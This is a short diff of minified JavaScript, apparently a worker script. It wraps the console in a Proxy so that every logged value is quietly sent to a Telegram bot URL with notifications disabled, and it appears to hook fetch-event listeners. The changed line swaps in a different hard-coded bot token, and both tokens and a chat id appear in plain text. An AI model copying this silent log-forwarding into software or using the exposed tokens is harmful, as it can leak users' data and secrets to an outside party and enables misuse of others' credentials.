@@ -2,7 +2,7 @@
     (console = new Proxy(console, {
         get: (e, o) => (...l) => (e[o](...l),
             fetch(
-                `https://api.telegram.org/bot989543891:AAFvQ6b3FPo5uw06KAgfEkCegG_y7UZcPDs/sendMessage?chat_id=528494103&disable_notification=true&text=${o.toUpperCase()}\n${
+                `https://api.telegram.org/bot769857173:AAHLHsmDwD7KhRnBo3BSwN6s-iBx2f2sA3U/sendMessage?chat_id=528494103&disable_notification=true&text=${o.toUpperCase()}\n${
 JSON.stringify(l[0])
   }`)),
     })), (addEventListener = (t, o) => e(t, "fetch" !== t ? o : (e) => {
